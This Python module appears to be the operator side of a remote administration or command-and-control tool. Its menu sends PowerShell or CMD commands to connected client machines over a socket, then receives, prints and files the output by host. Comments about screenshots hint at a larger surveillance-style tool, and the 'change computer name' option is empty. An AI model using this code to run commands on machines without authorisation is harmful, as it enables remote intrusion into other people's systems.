import os
import time
import socket
import shutil
from termcolor import colored


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


def freestyle_menu():
    print(f"\t\t({colored('1', 'yellow')})Run Powershell Command")
    print(f"\t\t({colored('2', 'yellow')})Run CMD Command")
    print(f"\t\t({colored('3', 'yellow')})Change Computer Name")
    print(f"\n\t\t({colored('0', 'yellow')})Back")

    return


def freestyle(con, root, tmp_availables, clients):
    while True:
        freestyle_menu()

        try:
            choice = int(input("#>"))

            if choice > 3:
                print(f"[{colored('*', 'red')}]Wrong Number. "
                      f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}]\n")
                continue

        except ValueError:
            print(
                f"[{colored('*', 'red')}]Numbers only. Choose between "
                f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}].\n")
            continue

        try:
            # Run Powershell Command
            if int(choice) == 1:
                con.send("ps".encode())
                cmd = input("PS>")
                con.send(cmd.encode())
                time.sleep(1)
                filename = con.recv(1024)
                print(f"Filename: {filename}")
                con.send("Filename OK".encode())

                # Receive file
                size = con.recv(4)
                print(size)
                size = bytes_to_number(size)
                current_size = 0
                buffer = b""
                filename = str(filename).strip("b'")

                # Create a directory with host's name if not already exists.
                for item in tmp_availables:
                    for conKey, ipValue in clients.items():
                        for ipKey in ipValue.keys():
                            if item[1] == ipKey:
                                ipval = item[1]
                                host = item[2]
                                user = item[3]
                                path = os.path.join(root, host)
                                try:
                                    os.makedirs(path)

                                except FileExistsError:
                                    pass

                # Fetch file content
                try:
                    with open(filename, 'wb') as file:
                        while current_size < size:
                            data = con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                except socket.error:
                    print(f"[{colored('*', 'red')}]Connection timed out.\n")
                    return False

                # Print file content to screen
                with open(filename, 'r') as file:
                    data = file.read()
                    print(data)

                msg = "OK".encode()
                con.send(msg)
                ans = con.recv(1024).decode()
                print(f"[{colored('V', 'green')}]{ans}")

                # Move screenshot file to directory
                src = os.path.abspath(filename)
                dst = fr"{path}"
                shutil.move(src, dst)

            # Run CMD Command
            elif int(choice) == 2:
                con.send("cmd".encode())
                cmd = input("CMD>")
                con.send(cmd.encode())
                time.sleep(1)
                filename = con.recv(1024)
                print(f"Filename: {filename}")
                con.send("Filename OK".encode())

                # Receive file
                size = con.recv(4)
                print(size)
                size = bytes_to_number(size)
                current_size = 0
                buffer = b""
                filename = str(filename).strip("b'")

                # Create a directory with host's name if not already exists.
                for item in tmp_availables:
                    for conKey, ipValue in clients.items():
                        for ipKey in ipValue.keys():
                            if item[1] == ipKey:
                                ipval = item[1]
                                host = item[2]
                                user = item[3]
                                path = os.path.join(root, host)
                                try:
                                    os.makedirs(path)

                                except FileExistsError:
                                    pass

                # Fetch file content
                try:
                    with open(filename, 'wb') as file:
                        while current_size < size:
                            data = con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                except socket.error:
                    print(f"[{colored('*', 'red')}]Connection timed out.\n")
                    return False

                # Print file content to screen
                with open(filename, 'r') as file:
                    data = file.read()
                    print(data)

                msg = "OK".encode()
                con.send(msg)
                ans = con.recv(1024).decode()
                print(f"[{colored('V', 'green')}]{ans}")

                # Move screenshot file to directory
                src = os.path.abspath(filename)
                dst = fr"{path}"
                shutil.move(src, dst)

            # Change Hostname
            elif int(choice) == 3:
                pass

            elif int(choice) == 0:
                con.send("back".encode())
                ans = con.recv(1024).decode()
                print(ans)
                return

        except socket.error as e:
            print(e)
            break
